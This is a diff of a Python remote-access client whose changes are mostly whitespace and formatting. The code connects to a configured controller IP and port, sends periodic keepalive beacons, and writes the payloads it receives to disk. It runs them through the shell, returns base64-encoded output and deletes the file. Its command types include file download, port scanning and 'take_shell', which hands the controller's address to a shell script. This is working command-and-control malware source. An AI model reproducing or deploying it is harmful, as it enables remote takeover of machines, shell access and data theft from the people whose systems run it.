@@ -17,13 +17,14 @@ DIR         = cfg.PATH
 INTERVAL    = cfg.t_interval
 
 
-client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+client  = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 client.connect((IP, PORT))
 
-q = queue.Queue(maxsize=200)
+q       = queue.Queue(maxsize=200)
 
-############# utility functions ############################
 
+
+############# utility functions ##############################
 def command_dispatch(command):
     command = ast.literal_eval(command)
     payload = str(command["payload"].decode("utf-8"))
@@ -34,11 +35,8 @@ def command_dispatch(command):
 
 
 def send_response(msg):
-    enc_msg     = str(msg).encode('utf-8')
-    base64_enc_msg = base64.b64encode(enc_msg)
-    base64_dec_msg = base64.decodebytes(base64_enc_msg)
-    msg= base64_dec_msg.decode()
-    print(msg)
+    enc_msg         = str(msg).encode('utf-8')
+    base64_enc_msg  = base64.b64encode(enc_msg)
     try:
         client.send(base64_enc_msg)
     except socket.error:
@@ -57,8 +55,8 @@ def send_data(msg):
 
 def send_alive():
     while(True):
-        msg    =  'ack'
-        msg    = msg.encode('utf-8')
+        msg    = 'ack'
+        msg    =  msg.encode('utf-8')
         try:
             client.send(msg)
             time.sleep(INTERVAL)
@@ -68,12 +66,7 @@ def send_alive():
     return
 
 #####################################################################
-
-
-
-
-
-#################### Threads Worker class ###############################
+#################### Threads Worker class ###########################
 
 class Worker(threading.Thread):
    def __init__(self, target, *args):
@@ -83,15 +76,8 @@ class Worker(threading.Thread):
    def run(self):
        self.target()
 
-#########################################################################
-
-
-
-
-####################### commands class ##################################
-
-
-
+#####################################################################
+####################### commands class ##############################
 class command():
     def __init__(self, task):
         self.type         = task['type']
@@ -102,38 +88,36 @@ class command():
     def __call__(self):
        self.funcs_to_run()
 
-    ## *************************** add here for new cmd_types!
+    ## *************************** add here for new cmd_types! ****
     def set_subprocess_args(self):  
         if self.type == 'download_file':
             self.args         = [sys.executable, self.exe_filepath] + self.args
         elif self.type == 'one_port_scan':
-            hostname = socket.gethostname()
-            ip_address = socket.gethostbyname(hostname)
-            self.args  = [sys.executable, self.exe_filepath, ip_address] + self.args
+            hostname        = socket.gethostname()
+            ip_address      = socket.gethostbyname(hostname)
+            self.args       = [sys.executable, self.exe_filepath, ip_address] + self.args
         elif self.type == 'ports_scan':
-            hostname = socket.gethostname()
-            ip_address = socket.gethostbyname(hostname)
-            self.args  = [sys.executable, self.exe_filepath, ip_address]
+            hostname        = socket.gethostname()
+            ip_address      = socket.gethostbyname(hostname)
+            self.args       = [sys.executable, self.exe_filepath, ip_address]
         elif self.type == 'take_shell':
-            ip_address = IP
-            self.args  = [sys.executable, self.exe_filepath, ip_address] + self.args
+            ip_address      = IP
+            self.args       = [sys.executable, self.exe_filepath, ip_address] + self.args
         else:
             pass
     def send_data_or_file(self,data):
         if self.type == 'download_file':
             data['filename'] = self.args[3]
         send_data(data)
-
-    ## **************************
-
+    ## **************************************************************
 
     def run_subprocess(self):
         send_response(f"Running cmd {self.id} \n")
         p = subprocess.run(self.args, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        err = p.stderr.decode()
+        err         = p.stderr.decode()
         if err!="":
             send_response(f"Error cmd {self.id} \n")
-        output = p.stdout.decode().strip('\r\n')
+        output      = p.stdout.decode().strip('\r\n')
         return {'output':output, 'err':err, 'id':self.id}
 
         
@@ -147,13 +131,8 @@ class command():
         self.send_data_or_file(data)
         self.delete_file()
         send_response(f"Finished cmd {self.id} \n")
-    
-        
-    
-    
 
-
-############################################################
+##########################################################################
 
 
 def recieve_cmds():
@@ -163,11 +142,11 @@ def recieve_cmds():
         pass
     while True:
         try:
-            data = client.recv(4096)
-            data = data.decode('utf-8')
+            data        = client.recv(4096)
+            data        = data.decode('utf-8')
             payload, args, typo, id = command_dispatch(data)
-            filename = f"file{id}.py"
-            filepath = os.path.join(os.getcwd()+DIR, filename)
+            filename    = f"file{id}.py"
+            filepath    = os.path.join(os.getcwd()+DIR, filename)
             with open(filepath, "w") as f:
                 f.write(payload)
             f.close()
@@ -189,23 +168,20 @@ def recieve_cmds():
 
 def do_cmds():
     while True:
-        task = q.get()
+        task    = q.get()
         if task == None:
             continue
-        cmd = command(task)
-        t = Worker(cmd)
+        cmd     = command(task)
+        t       = Worker(cmd)
         t.start()
 
 
     
 def main():
-    
-    alive_thread   = threading.Thread(target=send_alive)
+    alive_thread     = threading.Thread(target=send_alive)
     alive_thread.start()
-
     recieve_thread   = threading.Thread(target=recieve_cmds)
     recieve_thread.start()
-
     loader_thread    = threading.Thread(target=do_cmds)
     loader_thread.start()
 
